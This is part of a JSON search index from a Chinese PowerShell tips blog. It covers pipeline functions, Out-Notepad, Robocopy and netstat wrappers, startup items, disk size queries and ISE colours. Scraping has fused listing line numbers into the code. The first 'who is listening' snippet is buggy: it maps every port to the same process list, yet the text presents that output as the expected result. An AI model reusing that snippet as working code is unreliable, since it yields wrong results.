Win32_BIOS}","link":"/2016/01/07/use-get-ciminstance-with-dcom/"},{"title":"PowerShell 技能连载 - 通过哈希表转换创建新的对象","text":"从 PowerShell 3.0 开始，您可以通过哈希表创建预先初始化好的对象。只需要添加您希望预先初始化的属性，然后将哈希表转换为期望的类型。 以下是一个实际的例子： 12345678910#requires -Version 3$preInit = @{ Rate = -10 Volume = 100}Add-Type -AssemblyName System.Speech$speaker = [System.Speech.Synthesis.SpeechSynthesizer] $preInit$null = $Speaker.SpeakAsync(“Oh boy, that was a New Year’s party. I guess I need a little break.”) 当您运行这段代码时，PowerShell 创建一个新的 System.Speech 对象并且预先初始化了 rate 和 volume 的值。当您用 SpeakAsync() 方法将文本输出到语音时，文本会被很慢地念出来。Rate 的取值在 -10 到 10 之间。","link":"/2016/01/08/creating-new-objects-by-hash-table-conversion/"},{"title":"PowerShell 技能连载 - 查找当前文件系统路径","text":"PowerShell 不仅支持文件系统，您可以将当前路径设置为别的 provider（用 Set-Location 命令）。以下是一个始终返回当前文件系统，无论当前激活的是那个 provider 的技巧： 1234567891011121314151617181920PS C:\\&gt; cd hkcu:\\PS HKCU:\\&gt; $ExecutionContext.SessionState.PathCurrentLocation CurrentFileSystemLocation--------------- -------------------------HKCU:\\ C:\\​PS HKCU:\\&gt; $ExecutionContext.SessionState.Path.CurrentFileSystemLocationPath----C:\\​PS HKCU:\\&gt; $ExecutionContext.SessionState.Path.CurrentFileSystemLocation.PathC:\\","link":"/2016/01/11/finding-current-file-system-path/"},{"title":"PowerShell 技能连载 - 处理数据（第 1 部分）","text":"这是关于 PowerShell 函数如何通过管道或参数接受数据的三个技巧中的第一个。 在第一部分中，函数实时处理输入的信息。这消耗最少的内存并且快速提供结果： 123456789101112131415#requires -Version 2function Process-Data{ param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [Object[]] $Object ) process { foreach ($element in $Object) { &quot;Processing received element $element...&quot; } }} 请注意如何通过参数调用函数： 12345678PS C:\\&gt; Process-Data -Object 1Processing received element 1...PS C:\\&gt; Process-Data -Object 1,2,3,4Processing received element 1...Processing received element 2...Processing received element 3...Processing received element 4... 您也可以通过管道传送信息： 12345PS C:\\&gt; 1..4 | Process-DataProcessing received element 1...Processing received element 2...Processing received element 3...Processing received element 4...","link":"/2016/02/03/process-data-part-1/"},{"title":"PowerShell 技能连载 - 处理数据（第 2 部分）","text":"在第 1 部分中我们演示了一个 PowerShell 函数如何同时从参数和管道获取输入，并且实时处理它。这是最有效的方法并节省内存开销。 然而，有时需要先收集所有数据，待所有数据收集完成以后，一次性处理所有数据。以下是一个收集所有收到的数据并等所有数据都到齐以后才开始处理的例子： #requires -Version 2 function Collect-Data { param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [Object] [AllowEmptyString()] $Object ) begin { $bucket = New-Object System.Collections.ArrayList } process { $null = $bucket.Add($Object) } end { $count = $bucket.Count Write-Host &quot;Received $count objects.&quot; -ForegroundColor Yellow $bucket | Out-String } } 请注意 Collect-Data 如何既从参数又从管道获取信息： PS C:\\&gt; Collect-Data -Object 1,2,3 Received 3 objects. 1 2 3 PS C:\\&gt; 1..3 | Collect-Data Received 3 objects. 1 2 3 有两件事值得一提：千万不要用一个纯数组来收集信息。而是使用一个 ArraryList 对象，因为它添加新的元素比较快。并且避免将 $input 用于类似用途的自动变量。$input 只能用于管道输入并且忽略提交到参数的值。","link":"/2016/02/03/process-data-part-2/"},{"title":"PowerShell 技能连载 - 处理数据（第 3 部分）","text":"在第 1 和 第 2 部分，您学到了如何 PowerShell 函数如何处理通过参数和通过管道传入的信息。在这部分中，我们打算介绍一个函数如何接收多行文本并将它加工成一个字符串。 这个函数同时接受参数和管道传入的多行文本。该函数使用 StringBuilder 对象来收集所有的文本行，然后将收到的所有文本行合并成单个字符串： #requires -Version 2 function Collect-Text { param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [String[]] [AllowEmptyString()] $Text ) begin { $sb = New-Object System.Text.StringBuilder } process { foreach ($line in $Text) { $null = $sb.AppendLine($line) } } end { $result = $sb.ToString() $result } } 请注意如何既支持通过参数，也支持通过管道传递文本行： PS C:\\&gt; Collect-Text -Text 'Line 1', '', 'Line 2' Line 1 Line 2 PS C:\\&gt; 'Line 1', '', 'Line 2' | Collect-Text Line 1 Line 2 请注意参数：它使用了 [AllowEmptyString()] 属性。它确保可以接受空字符串参数。在 mandatory （必须）参数中，如果没有这个属性，是不允许空字符串的。","link":"/2016/02/04/process-data-part-3/"},{"title":"PowerShell 技能连载 - 将窗口置于前台","text":"PowerShell 可以使用 Add-Type 来操作 Windows 内置的 API 功能。通过这种方法，可以很容易地将所有进程的窗口置于前台。以下是您需要的函数： #requires -Version 2 function Show-Process($Process, [Switch]$Maximize) { $sig = ' [DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); [DllImport(&quot;user32.dll&quot;)] public static extern int SetForegroundWindow(IntPtr hwnd); ' if ($Maximize) { $Mode = 3 } else { $Mode = 4 } $type = Add-Type -MemberDefinition $sig -Name WindowAPI -PassThru $hwnd = $process.MainWindowHandle $null = $type::ShowWindowAsync($hwnd, $Mode) $null = $type::SetForegroundWindow($hwnd) } 要测试 Show-Process，以下是一段示例代码，演示如何使用它： # launch Notepad minimized, then make it visible $notepad = Start-Process notepad -WindowStyle Minimized -PassThru Start-Sleep -Seconds 2 Show-Process -Process $notepad # switch back to PowerShell, maximized Start-Sleep -Seconds 2 Show-Process -Process (Get-Process -Id $PID) -Maximize # switch back to Notepad, maximized Start-Sleep -Seconds 2 Show-Process -Process $notepad -Maximize # switch back to PowerShell, normal window Start-Sleep -Seconds 2 Show-Process -Process (Get-Process -Id $PID)","link":"/2016/02/05/bringing-window-in-the-foreground/"},{"title":"PowerShell 技能连载 - 统计一个 Word 文档中的页数","text":"假设您有一系列 Word 文档，并且希望知道它们共有多少页。以下是一个函数，传入一个 Word 文件参数，便能得到它包含多少页： #requires -Version 1 # adjust path to point to an existing Word file: $Path = &quot;C:\\...\\SomeChapter.doc&quot; $word = New-Object -ComObject Word.Application $word.Visible = $true $binding = 'System.Reflection.BindingFlags' -as [type] $doc = $word.Documents.Open($Path) $doc.Repaginate() $prop = $doc.BuiltInDocumentProperties(14) $pages = [System.__ComObject].invokemember('value',$binding::GetProperty,$null,$prop,$null) $doc.Close(0) $word.Quit() &quot;$Path has $Pages pages.&quot; 如果这对您有用，可以将它改为一个函数，您就可以用 PowerShell 来统计多个 Word 文档共有多少页。","link":"/2016/02/08/counting-pages-in-a-word-document/"},{"title":"PowerShell 技能连载 - 换算货币","text":"PowerShell 是一个非常有用的语言，可以调用 Web Service 和访问网页。如果您将两者合并成一个动态参数，就能得到一个专业的，支持实时汇率的货币换算器。 以下 ConvertTo-Euro 函数可以输入其他货币并转换成欧元。该函数有一个 -Currency 参数，并可以动态地传入欧洲中央银行支持的货币。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364function ConvertTo-Euro{ [CmdletBinding()] param( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [Double] $Value ) dynamicparam { $Bucket = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary $Attributes = New-Object -TypeName System.Collections.ObjectModel.Collection[System.Attribute] $AttribParameter = New-Object System.Management.Automation.ParameterAttribute $AttribParameter.Mandatory = $true $Attributes.Add($AttribParameter) if ($script:currencies -eq $null) { $url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml' $result = Invoke-RestMethod -Uri $url $script:currencies = $result.Envelope.Cube.Cube.Cube.currency } $AttribValidateSet = New-Object System.Management.Automation.ValidateSetAttribute($script:currencies) $Attributes.Add($AttribValidateSet) $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter('Currency',[String], $Attributes) $Bucket.Add('Currency', $Parameter) $Bucket } begin { foreach ($key in $PSBoundParameters.Keys) { if ($MyInvocation.MyCommand.Parameters.$key.isDynamic) { Set-Variable -Name $key -Value $PSBoundParameters.$key } } $url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml' $rates = Invoke-RestMethod -Uri $url $rate = $rates.Envelope.Cube.Cube.Cube | Where-Object { $_.currency -eq $Currency} | Select-Object -ExpandProperty Rate } process { $result = [Ordered]@{ Value = $Value Currency = $Currency Rate = $rate Euro = ($Value / $rate) Date = Get-Date } New-Object -TypeName PSObject -Property $result }} 该函数演示了如何向动态参数填充动态数据，以及该数据如何缓存以免智能感知每次触发一个新的请求过程。 以下使一些您可能期待的例子（需要 Internet 连接）： PS C:\\&gt; 100, 66.9 | ConvertTo-Euro -Currency DKK Value : 100 Currency : DKK Rate : 7.4622 Euro : 13,4008737369677 Date : 26.01.2016 21:32:44 Value : 66,9 Currency : DKK Rate : 7.4622 Euro : 8,96518453003136 Date : 26.01.2016 21:32:45 PS C:\\&gt; ConvertTo-Euro -Currency USD -Value 99.78 Value : 99,78 Currency : USD Rate : 1.0837 Euro : 92,0734520623789 Date : 26.01.2016 21:33:01","link":"/2016/02/09/converting-currencies/"},{"title":"PowerShell 技能连载 - 神奇的下划线变量","text":"以下是一个非常特别（并且有详细文档的）的使用 PowerShell 变量的方法。请看这个函数： 12345678910111213141516#requires -Version 2function Test-DollarUnderscore{ param ( [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true)] [string] $Test ) process { &quot;received: $Test&quot; }} 它初看起来并没有什么特别之处。您可以将数值赋给 -Test 参数，并且该函数返回它们： 12PS C:\\&gt; Test-DollarUnderscore -Test 'Some Data'received: Some Data 但是请看当您通过管道传送一个数据给该函数时发生了什么： 12345PS C:\\&gt; 1..4 | Test-DollarUnderscore -Test { &quot;I am receiving $_&quot; }received: I am receiving 1received: I am receiving 2received: I am receiving 3received: I am receiving 4 -Test 参数瞬间自动神奇地接受脚本块了（虽然赋予的类型是 string）。而且在脚本块中，您可以存取输入管道的数据。 您能得到这个非常特别的参数支持功能是因为您为一个必选参数设置了 ValueFromPipelineByPropertyName=$true，并且输入的数据没有一个属性和该参数匹配。","link":"/2016/02/10/magic-underscore-variable/"},{"title":"PowerShell 技能连载 - 发送文本到记事本","text":"记事本可以用来显示文本结果。通常，您需要将文本保存到文件，然后用记事本打开该文件。不过还有一个更好的办法：打开一个空白的记事本，然后用 Windows 消息直接把文本发送到未命名的记事本编辑器中。 这个函数称为 Out-Notepad。无论您传给这个函数什么文本，它都会在记事本的一个未命名实例中显示： 123456789101112131415161718192021222324252627282930313233343536373839#requires -Version 2function Out-Notepad{ param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [String] [AllowEmptyString()] $Text ) begin { $sb = New-Object System.Text.StringBuilder } process { $null = $sb.AppendLine($Text) } end { $text = $sb.ToString() $process = Start-Process notepad -PassThru $null = $process.WaitForInputIdle() $sig = ' [DllImport(&quot;user32.dll&quot;, EntryPoint = &quot;FindWindowEx&quot;)]public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow); [DllImport(&quot;User32.dll&quot;)]public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam); ' $type = Add-Type -MemberDefinition $sig -Name APISendMessage -PassThru $hwnd = $process.MainWindowHandle [IntPtr]$child = $type::FindWindowEx($hwnd, [IntPtr]::Zero, &quot;Edit&quot;, $null) $null = $type::SendMessage($child, 0x000C, 0, $text) }} 这是一些示例调用： PS C:\\&gt; Get-Content $env:windir\\system32\\drivers\\etc\\hosts | Out-Notepad PS C:\\&gt; Get-Process | Out-String | Out-Notepad","link":"/2016/02/11/send-text-to-notepad/"},{"title":"PowerShell 技能连载 - 将对象发送到记事本","text":"在前一个技能里我们演示了如何将文本发送到一个全新的记事本实例中。今天，您会获得一个增强版的 Out-Notepad：您现在可以通过管道传输任何东西到记事本了。如果内容不是字符串，Out-Notepad 会使用内置的 PowerShell ETS 将它转换为文本并且合适地显示出来： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#requires -Version 2function Out-Notepad{ param ( [Parameter(Mandatory=$true, ValueFromPipeline=$true)] [Object] [AllowEmptyString()] $Object, [Int] $Width = 150 ) begin { $al = New-Object System.Collections.ArrayList } process { $null = $al.Add($Object) } end { $text = $al | Format-Table -AutoSize -Wrap | Out-String -Width $Width $process = Start-Process notepad -PassThru $null = $process.WaitForInputIdle() $sig = ' [DllImport(&quot;user32.dll&quot;, EntryPoint = &quot;FindWindowEx&quot;)]public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow); [DllImport(&quot;User32.dll&quot;)]public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam); ' $type = Add-Type -MemberDefinition $sig -Name APISendMessage2 -PassThru $hwnd = $process.MainWindowHandle [IntPtr]$child = $type::FindWindowEx($hwnd, [IntPtr]::Zero, &quot;Edit&quot;, $null) $null = $type::SendMessage($child, 0x000C, 0, $text) }} 您现在可以通过管道传输任何东西到 Out-Notepad。它将原样显示： PS C:\\&gt; Get-Content $env:windir\\system32\\drivers\\etc\\hosts | Out-Notepad 如果您通过管道传送对象，Out-Notepad 会将它们转换为文本并且不会截断任何东西。您可能会希望用 -Width 参数来确定页宽，以便正常显示： PS C:\\&gt; Get-EventLog -LogName System -EntryType Error, Warning -Newest 10 | Out-Notepad -Width 130 另外您可能需要最大化记事本或禁用换行来查看正确的格式。","link":"/2016/02/12/sending-objects-to-notepad/"},{"title":"PowerShell 技能连载 - 谁在监听？（第一部分）","text":"一个过去十分好用的 netstat.exe 可以告诉您应用程序在监听哪些端口，不过结果是纯文本。PowerShell 可以用正则表达式将文本分割成 CSV 数据，ConvertFrom-Csv 可以将文本转换为真实的对象。 这是一个如何用 PowerShell 处理最基础数据的例子： 1234567891011121314#requires -Version 2NETSTAT.EXE -anop tcp|Select-Object -Skip 4|ForEach-Object -Process { [regex]::replace($_.trim(),'\\s+',' ')}|ConvertFrom-Csv -d ' ' -Header 'proto', 'src', 'dst', 'state', 'pid'|Select-Object -Property src, state, @{ name = 'process' expression = { (Get-Process -PipelineVariable $_.pid).name }} |Format-List 结果类似如下： src : 0.0.0.0:135 state : LISTEN process : {Adobe CEF Helper, Adobe CEF Helper, Adobe Desktop Service, AdobeIPCBroker...} src : 0.0.0.0:445 state : LISTEN process : {Adobe CEF Helper, Adobe CEF Helper, Adobe Desktop Service, AdobeIPCBroker...} src : 0.0.0.0:5985 state : LISTEN process : {Adobe CEF Helper, Adobe CEF Helper, Adobe Desktop Service, AdobeIPCBroker...} src : 0.0.0.0:7680 state : LISTEN process : {Adobe CEF Helper, Adobe CEF Helper, Adobe Desktop Service, AdobeIPCBroker...} src : 0.0.0.0:7779 state : LISTEN process : {Adobe CEF Helper, Adobe CEF Helper, Adobe Desktop Service, AdobeIPCBroker...}","link":"/2016/02/15/who-is-listening-part-1/"},{"title":"PowerShell 技能连载 - 谁在监听？（第二部分）","text":"如果您的系统是 Windows 8 或 Windows Server 2012 或以上版本，您可以使用 Get-NetTcpConnection 来找出哪个网络端口正在使用中，以及谁在监听这些端口。 以下脚本不仅列出正在使用的端口而且列出了正在监听该端口的进程。如果进程是 “svchost”，该脚本还会找出是哪个服务启动了这个进程： 1234567891011121314151617181920212223242526#requires -Version 3 -Modules NetTCPIP$service = @{}$Process = @{ Name = 'Name' Expression = { $id = $_.OwningProcess $name = (Get-Process -Id $id).Name if ($name -eq 'svchost') { if ($service.ContainsKey($id) -eq $false) { $service.$id = Get-WmiObject -Class win32_Service -Filter &quot;ProcessID=$id&quot; | Select-Object -ExpandProperty Name } $service.$id -join ',' } else { $name } }}Get-NetTCPConnection |Select-Object -Property LocalPort, OwningProcess, $Process |Sort-Object -Property LocalPort, Name -Unique 结果类似如下： LocalPort OwningProcess Name --------- ------------- ---- 135 916 RpcEptMapper,RpcSs 139 4 System 445 4 System 5354 2480 mDNSResponder 5985 4 System 7680 544 Appinfo,BITS,Browser,CertPropSvc,DoSvc,iphlpsvc,Lanm... 7779 4 System 15292 7364 Adobe Desktop Service 27015 2456 AppleMobileDeviceService (...)","link":"/2016/02/16/who-is-listening-part-2/"},{"title":"PowerShell 技能连载 - 得到一个借口","text":"以下是一个快速的方法来得到一个借口——假设您有 Internet 连接： #requires -Version 3 function Get-Excuse { $url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl' $ProgressPreference = 'SilentlyContinue' $page = Invoke-WebRequest -Uri $url -UseBasicParsing $pattern = '(?m)&lt;br&gt;&lt;font size = &quot;\\+2&quot;&gt;(.+)' if ($page.Content -match $pattern) { $matches[1] } } 它演示了如何使用 Invoke-WebRequest 来下载一个网页的 HTML 内容，然后使用正则表达式来抓取网页的内容。","link":"/2016/02/17/getting-an-excuse/"},{"title":"PowerShell 技能连载 - 不要混合不同的对象","text":"如果您连续输出完全不同的对象，您可能丢失信息。请看这个例子： #requires -Version 2 $hash = @{ Name = 'PowerShell Conference EU' Date = 'April 20, 2016' City = 'Hannover' URL = 'www.psconf.eu' } New-Object -TypeName PSObject -Property $hash $b = Get-Process -Id $pid $b 当您运行这段代码时，您将得到这样的结果： Date URL Name City ---- --- ---- ---- April 20, 2016 www.psconf.eu PowerShell Conference EU Hannover powershell_ise 看起来 $b (process) 的几乎所有属性都丢失了。原因是 PowerShell 是实时输出对象的，而且首次提交的对象决定了在表格中显示哪些属性。所有接下来的对象都将纳入这张表格中。 如果您必须要输出不同的对象，请将它们用管道输出到 Out-Host。每次您输出到 Out-Host，PowerShell 都将创建一个具有新的表格标题的输出。","link":"/2016/02/18/do-not-mix-different-objects/"},{"title":"PowerShell 技能连载 - 用 #requires 语句装饰脚本","text":"PowerShell 支持一系列 #requires 语句。技术上它们是注释，但是 PowerShell 会检查这些语句所申明的必要条件，并且如果条件不满足，它将不会执行这个脚本。另外，#requires 语句能快速地告知您运行脚本的前提条件。 #requires -Modules PrintManagement #requires -Version 3 #Requires -RunAsAdministrator #requires 语句必须是一个脚本的第一条语句，并且它只对保存的脚本有效。","link":"/2016/02/19/decorate-scripts-with-requires-statements/"},{"title":"PowerShell 技能连载 - 使用工作流来并发执行代码","text":"如果您希望同时执行多个任务，以下有多种方法用 Powershell 实现。一种是使用工作流。它们是 PowerShell 3.0 中引入的： #requires -Version 3 workflow Test-ParallelForeach { param ( [String[]] $ComputerName ) foreach -parallel -throttlelimit 8 ($Machine in $ComputerName) { &quot;Begin $Machine&quot; Start-Sleep -Seconds (Get-Random -min 3 -max 5) &quot;End $Machine&quot; } } $list = 1..20 Test-ParallelForeach -ComputerName $list | Out-GridView Test-ParallelForeach 处理一个计算机列表（在这个例子中，是一个数字列表）。它们同时执行。要控制资源的使用，并行循环将节流限制为 8，所以所以在这个例子中的 20 台计算机是 8 个一组处理的。 请注意使用工作流需要更多地了解它们的架构和限制。这个例子关注于工作流提供的并行循环技术。","link":"/2016/02/22/using-workflows-to-parallelize-code/"},{"title":"PowerShell 技能连载 - 直接使用 .NET 类型","text":"Cmdlet 内含了纯 .NET 代码，所以感谢 cmdlet，我们通常无需接触 .NET 代码。不过，如果您需要的话仍然可以使用。以下是一系列调用示例，演示了如何调用 .NET 方法： #requires -Version 2 [System.Convert]::ToString(687687687, 2) [Math]::Round(4.6) [Guid]::NewGuid() [System.IO.Path]::ChangeExtension('c:\\test.txt', 'bak') [System.Net.DNS]::GetHostByName('dell1') [System.Net.DNS]::GetHostByAddress('192.168.1.124') [Environment]::SetEnvironmentVariable() # dangerous, save your work first [Environment]::FailFast('Oops') Add-Type -AssemblyName PresentationFramework $dialog = New-Object Microsoft.Win32.OpenFileDialog $dialog.ShowDialog() $dialog.FileName","link":"/2016/02/23/using-net-types-directly/"},{"title":"PowerShell 技能连载 - 友好地使用 Robocopy","text":"支持 PowerShell 2.0 以上版本 Robocopy 是一个用于拷贝文件的工具，它在 PowerShell 里的功能也是一样。然而您可以用 PowerShell 将 robocopy 封装在一个对用户友好的 PowerShell 函数中。通过这种方式，您不再需要记忆 robocopy 别扭的命令行选项。取而代之的是 PowerShell 参数和智能提示功能。 一次 robocopy 的调用可能看起来如下： 1PS C:\\&gt; Invoke-Robocopy -Source $env:windir -Destination c:\\logs -Filter *.log -Recurse -Open 以下是封装函数： 12345678910111213141516171819202122232425262728293031323334353637383940#requires -Version 3function Invoke-Robocopy{ param ( [String] [Parameter(Mandatory)] $Source, [String] [Parameter(Mandatory)] $Destination, [String] $Filter = '*', [Switch] $Recurse, [Switch] $Open ) if ($Recurse) { $DoRecurse = '/S' } else { $DoRecurse = '' } robocopy $Source $Destination $Filter $DoRecurse /R:0 if ($Open) { explorer.exe $Destination }}","link":"/2016/08/30/using-friendly-robocopy/"},{"title":"PowerShell 技能连载 - 替换类似 “Umlauts” 的特殊字符","text":"支持 PowerShell 2.0 以上版本 有些时候我们需要将一些字符替换，例如德语的 “Umlauts”，来适应用户名或邮箱地址。 以下是一个演示如何实现这个功能的小函数： 123456789101112131415161718#requires -Version 3function Convert-Umlaut{ param ( [Parameter(Mandatory)] $Text ) $output = $Text.Replace('ö','oe').Replace('ä','ae').Replace('ü','ue').Replace('ß','ss').Replace('Ö','Oe').Replace('Ü','Ue').Replace('Ä','Ae') $isCapitalLetter = $Text -ceq $Text.toUpper() if ($isCapitalLetter) { $output = $output.toUpper() } $output} 要转换一个字符串，请这样使用： 12PS C:\\&gt; Convert-Umlaut -Text &quot;Mößler, Christiansön&quot;Moessler, Christiansoen","link":"/2016/08/31/replacing-special-chars-like-umlauts/"},{"title":"PowerShell 技能连载 - 通过管道输入数据","text":"在前一个技能里我们演示了 Convert-Umlaut 如何转换一个字符串中的特殊字符。这在一个函数接受管道输入的时候更有用。让我们来看看增加这种特性所需要做的改变。 在不支持管道的情况下，该函数大概长这个样子： 123456789101112131415161718#requires -Version 3function Convert-Umlaut{ param ( [Parameter(Mandatory)] $Text ) $output = $Text.Replace('ö','oe').Replace('ä','ae').Replace('ü','ue').Replace('ß','ss').Replace('Ö','Oe').Replace('Ü','Ue').Replace('Ä','Ae') $isCapitalLetter = $Text -ceq $Text.toUpper() if ($isCapitalLetter) { $output = $output.toUpper() } $output} 可以通过这种方式执行： 12PS C:\\&gt; Convert-Umlaut -Text &quot;Mößler, Christiansön&quot;Moessler, Christiansoen 然而，它不能像这样执行： 1PS C:\\&gt; &quot;Mößler, Christiansön&quot; | Convert-Umlaut 要增加管道功能，需要做两件事： 参数需要标记为支持管道数据。 在迭代中对每个输入的元素进行处理的代码需要放置在 “process“ 代码块中。 以下是改变后的代码： 123456789101112131415161718192021#requires -Version 3function Convert-Umlaut{ param ( [Parameter(Mandatory, ValueFromPipeline)] $Text ) process { $output = $Text.Replace('ö','oe').Replace('ä','ae').Replace('ü','ue').Replace('ß','ss').Replace('Ö','Oe').Replace('Ü','Ue').Replace('Ä','Ae') $isCapitalLetter = $Text -ceq $Text.toUpper() if ($isCapitalLetter) { $output = $output.toUpper() } $output }} 现在，也可以通过管道传输数据了： 12PS C:\\&gt; &quot;Mößler, Christiansön&quot; | Convert-UmlautMoessler, Christiansoen","link":"/2016/09/01/receiving-input-via-pipeline/"},{"title":"PowerShell 技能连载 - 替换 CSV 文件列名","text":"支持 PowerShell 2 以上版本 当读取 CSV 数据的时候，可能会希望重命名 CSV 的列名，以下是一个简单的实现：只需要一行一行地读取文本，并跳过第一行（第一行包括 CSV 的列名）。然后，将表头替换成一个自定义的列名： 12345$header = ‘NewHeader1’, 'NewHeader2', 'NewHeader3'Get-Content N:\\somepathtofile\\userlist.csv -Encoding Default | Select-Object -Skip 1 | ConvertFrom-CSV -UseCulture -Header $header","link":"/2016/09/02/replacing-csv-file-headers/"},{"title":"PowerShell 技能连载 - 查找自启动项","text":"支持 PowerShell 3 以上版本 If you’d like to know which programs start automatically on your machine, WMI may help: 如果您想了解有多少个程序随着您的机器自动启动，WMI 也许能帮上忙： 123456789101112131415161718192021222324252627PS C:\\&gt; Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -Property Name, Location, User, Command, DescriptionName : OneDriveLocation : HKU\\S-1-5-21-2012478179-265285931-690539891-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunUser : DESKTOP-7AAMJLF\\tobweCommand : &quot;C:\\Users\\tobwe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe&quot; /backgroundDescription : OneDriveName : BluetoothLocation : Common StartupUser : PublicCommand : C:\\PROGRA~1\\WIDCOMM\\BLUETO~1\\BTTray.exeDescription : BluetoothName : Snagit 12Location : Common StartupUser : PublicCommand : C:\\PROGRA~2\\TECHSM~1\\SNAGIT~1\\Snagit32.exeDescription : Snagit 12Name : RTHDVCPLLocation : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunUser : PublicCommand : &quot;C:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64.exe&quot; -sDescription : RTHDVCPL...","link":"/2016/09/05/finding-auto-starts/"},{"title":"PowerShell 技能连载 - 启用远程管理","text":"支持 PowerShell 2 以上版本 许多早先基于 DCOM 的命令需要打开“远程管理防火墙例外”，才能访问远程系统。其中包含 Get-WmiObject 等 Cmdlet。 一个启用该功能的简单办法是在管理员权限下运行以下命令： 1netsh firewall set service remoteadmin enable 虽然该命令已经准备淘汰，不过它仍然能用，而且是配置防火墙的最简单方法。","link":"/2016/09/06/enabling-remote-administration/"},{"title":"PowerShell 技能连载 - 检查（本地和远程的）硬盘容量","text":"WMI 可以提供硬盘的容量和剩余空间。PowerShell 会用返回这样的友好信息： 123456789101112131415PS C:\\&gt; # localPS C:\\&gt; Get-HardDriveSizeDriveLetter Free(GB) Size(GB) Percent----------- -------- -------- -------C: 823,7 942,3 87,4PS C:\\&gt; # remotePS C:\\&gt; Get-HardDriveSize -ComputerName server2 -Credential server2\\TobiasDriveLetter Free(GB) Size(GB) Percent----------- -------- -------- -------C: 87,3 436,9 20D: 5,3 25 21,3 以下是代码： 12345678910111213141516171819202122232425262728293031323334function Get-HardDriveSize{ param ( $ComputerName, $Credential ) # get calculated properties: $prop1 = @{ Name = 'DriveLetter' Expression = { $_.DeviceID } } $prop2 = @{ Name = 'Free(GB)' Expression = { [Math]::Round(($_.FreeSpace / 1GB),1) } } $prop3 = @{ Name = 'Size(GB)' Expression = { [Math]::Round(($_.Size / 1GB),1) } } $prop4 = @{ Name = 'Percent' Expression = { [Math]::Round(($_.Freespace * 100 / $_.Size),1) } } # get all hard drives Get-CimInstance -ClassName Win32_LogicalDisk @PSBoundParameters -Filter &quot;DriveType=3&quot; | Select-Object -Property $prop1, $prop2, $prop3, $prop4}","link":"/2016/09/07/checking-hard-drive-size-local-and-remote/"},{"title":"PowerShell 技能连载 - 查看 ASCII 码","text":"这是一种查看任何字符 ASCII 码的简单办法。字符可能截取自网站或者来自从 internet 上下载的脚本。 只需要打开 PowerShell 然后输入以下代码： 1234567891011# paste character(s) inside the quotes$text = ''foreach($char in [char[]]$text){ 'Character {0,-3} Decimal {1,-5} Hex {1,-4:X}' -f $char, [int]$char} 下一步，将字符（可以多个）粘贴在引号内，然后运行代码。为了测试，可以在 PowerShell 中运行以下代码： 1PS C:\\&gt; charmap 这将打开字符映射表。您可以在其中选择一种字体，例如 DingBats，以及一个或多个字符。将它们复制到剪贴板，然后将它们粘贴到上面的 PowerShell 代码中。当您运行代码时，它将以十进制和十进制两种方式返回所选字符的 ASCII 码值。它们应该和字符映射表工具状态栏显示的值相同。","link":"/2016/09/08/finding-ascii-codes/"},{"title":"PowerShell 技能连载 - Saving PowerShell User Defaults","text":"我们将要进入的“色彩之周”将带来许多改变 PowerShell ISE 编辑器和控制台颜色的技能。多数应用到 PowerShell 的改变并没有保存。PowerShell ISE 并不会保存一些颜色设置，但一个更健壮的方法是在 PowerShell 的一个描述脚本中改变您的自定义设置。 任何一个 PowerShell 宿主（控制台或 PowerShell ISE 或其它支持 PowerShell 的程序）都会执行的脚本如下： 12PS C:\\&gt; $profile.CurrentUserAllHostsC:\\Users\\Tobias\\Documents\\WindowsPowerShell\\profile.ps1 Anything that applies to a specific host like the console only, or the PowerShell ISE only, goes here: 任何一个特定的 PowerShell 宿主，例如特指控制台或特指 PowerShell ISE 启动执行的脚本如下： 12PS C:\\&gt; $profile.CurrentUserCurrentHostC:\\Users\\Tobias\\Documents\\WindowsPowerShell\\XXXXXXXXXXXXXX_profile.ps1 请注意路径中的 “XXX”。需要在指定的宿主内运行上面的代码才有效。根据不同的宿主，这行代码会返回不同的路径。 另外请注意这些调用只是返回描述脚本的路径。它缺省情况下并不存在。您可能需要自己创建它，包括 “WindowsPowerShell” 文件夹。当描述脚本存在时，PowerShell 宿主启动的时候就会执行它。 请注意需要打开脚本执行功能。所以您可能需要一次性地允许脚本执行，比如： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force","link":"/2016/09/09/saving-powershell-user-defaults/"},{"title":"PowerShell 技能连载 - 颜色之周: 设置 PowerShell ISE 控制台的颜色","text":"支持 PowerShell 3 以上版本 本周我们将关注如何改变 PowerShell 控制台和 PowerShell ISE 的颜色，以便设置您的 PowerShell 环境。 您可以通过 $host 对象改变 PowerShell ISE 控制台的背景色和前景色，这种方式提供了 16 中预设的颜色可选择： 12345PS&gt; $host.UI.RawUI.ForegroundColor = 'Red'PS&gt; $host.UI.RawUI.ForegroundColor = 'White'PS&gt; 这些命令将前景色先改为红色，然后改回白色。 在 PowerShell ISE 中，您也可以通过 $psISE 变量修改这些颜色。在这里可以用 RGB 值构成您自己的背景色和前景色。让我们把 PowerShell ISE 控制台的前景色改为一些别的： 123PS&gt; $psise.Options.ConsolePaneForegroundColor = '#FFDD98'PS&gt; $psise.Options.ConsolePaneForegroundColor = '#FFFFFF' 